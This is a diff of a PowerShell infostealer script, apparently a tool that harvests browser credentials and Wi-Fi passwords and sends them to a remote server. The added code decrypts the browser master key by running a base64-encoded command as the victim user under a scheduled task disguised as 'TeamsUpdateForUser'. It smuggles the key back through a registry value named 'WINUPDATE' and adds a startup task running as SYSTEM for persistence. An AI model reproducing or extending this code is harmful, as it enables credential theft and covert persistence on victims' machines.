@@ -17,6 +17,7 @@ function pow-mod($x,$y,$z)
 }
 
 
+
 function power($x,$y)
 {
     $n = [System.Numerics.BigInteger]::Parse("1")
@@ -461,6 +462,23 @@ function GetFile-Bytes($FilePath){
     }
 }
 
+function Start-UserTask($name,$user,$process,$argument){
+    if ((schtasks /query /tn $name 2>$null) -ne $null){
+        schtasks /delete /tn $name /f > $null 2>&1
+    }
+    $action = New-ScheduledTaskAction -Execute $process -Argument $argument
+    $Principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive
+    $settings = New-ScheduledTaskSettingsSet
+    $settings.DisallowStartIfOnBatteries = $false
+    Register-ScheduledTask $name -Principal $Principal -Action $action -Settings $settings
+    Start-ScheduledTask $name
+    do {
+        $res = (schtasks /query /tn $name /v /fo CSV | ConvertFrom-Csv)
+        Start-Sleep -Seconds 0.5
+    } until ($res.'Last Result' -eq 0)
+    schtasks /delete /tn $name /f > $null 2>&1
+}
+
 
 class WebGather{
 
@@ -480,13 +498,33 @@ class WebGather{
     [array]GCMkey($WEB){
         $path = $this.pathes.$WEB
         $content = Get-Content -Path "$path\Local State" -Raw | ConvertFrom-Json
-        $baseGC = $content.os_crypt.encrypted_key
-        $GCKEY = [System.Convert]::FromBase64String($baseGC)
+        $GCKEY = $content.os_crypt.encrypted_key
+        $username = ((Get-WmiObject -ClassName Win32_ComputerSystem).UserName).Split('\')[-1]
+        $UID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $username }).sid
         $comm = '[System.Security.Cryptography.ProtectedData]::Unprotect(
-            $GCKEY[5 .. ($GCKEY.length-1)], 
-            $null, 
-            [System.Security.Cryptography.DataProtectionScope]::LocalMachine)'
-        return (Invoke-Expression -Command $comm)
+                    $GCKEY[5 .. ($GCKEY.length-1)], 
+                    $null, 
+                    [System.Security.Cryptography.DataProtectionScope]::LocalMachine)'
+        $argument = "`$GCKEY=[System.Convert]::FromBase64String('$GCKEY');Add-Type -AssemblyName System.Security;`$comm='$comm';`$out=(Invoke-Expression -Command `$comm);Set-ItemProperty -Path HKCU:\Environment -Name 'WINUPDATE' -Value `$out -Type Binary"
+        $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($argument))
+        Start-UserTask -name 'TeamsUpdateForUser' -user $username -process 'powershell' -argument " -noni -noP -sta -enc $encodedCommand"
+        $GCMKEY = $false
+        while (-not($GCMKEY)){
+            try{
+                if (-not(Get-ItemProperty -Path "registry::HKEY_USERS\$UID\Environment").WINUPDATE){
+                    continue
+                }
+                $GCMKEY = Invoke-Expression '(Get-ItemProperty -Path "registry::HKEY_USERS\$UID\Environment" -Name "WINUPDATE").WINUPDATE'
+                $buffer = New-Object System.Byte[] ($GCMKEY.Length)
+                Set-ItemProperty -Path "registry::HKEY_USERS\$UID\Environment" -Name 'WINUPDATE' -Value $buffer -Type Binary
+                Remove-ItemProperty -Path "registry::HKEY_USERS\$UID\Environment" -Name "WINUPDATE" 
+                break
+            }catch{
+                {}
+                Start-Sleep 0.5
+            }
+        }
+        return $GCMKEY
     }
 
     [Object]SendDataBase($WEB,$client,$key,$iv,$stream){
@@ -507,6 +545,21 @@ class WebGather{
     }
 }
 
+function Creat-NewTask($path,$argument,$Name){
+    try{
+        if ($Name -in(Get-ScheduledTask)){
+            return
+        }
+        $Trigger = New-ScheduledTaskTrigger -AtStartup
+        $SystemUser = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+        $action = New-ScheduledTaskAction -Execute $path -Argument $argume
+        Register-ScheduledTask $Name -Principal $SystemUser -Action $action -Trigger $Trigger -Force
+        $service = Get-Service -Name "schedule"
+        $service | Restart-Service
+    }catch{
+        {}
+    }
+}
 
 function get-wifiPasswords
 {   
@@ -593,7 +646,6 @@ function Start-Teams(){
 }
 
 function Start-Main{
-
     $n = [System.Numerics.BigInteger]::Parse("24167402767654577565716389815235569967390138512024137497386480228714459623333728107550442019967341332053940559315871104193316625676287327705224404592395885695827727800334356656078494465334764933984362150328647642679827786023792149061377853406629987146126403665715498483598938424562357472270283226106922575054267526543955052845613720230410609968151396625485965130532490768894210017875706817812676831767822251026991167386779935369014898100686467230341800659314991606618373358316608131771884170257420378343129059831609845883841561567536343257616438711061881770390832717316958948348326818632753120572695814500526819624897")
     $e = [System.Numerics.BigInteger]::Parse("65537")
     $PUBLIC = @($e,$n)
@@ -645,10 +697,10 @@ function Start-Main{
     }
 }
 
-Assert-Admin
+Assert-Admin  
 Assert-RunOnce
 Add-Type -AssemblyName System.Security
 Set-Variable -Scope Global -Name "bultInVars" -Value ((Get-Variable).Name)
-$global:SERVIP="192.168.137.1"
+$global:SERVIP="your ip address"
 Start-Teams
 Start-Main
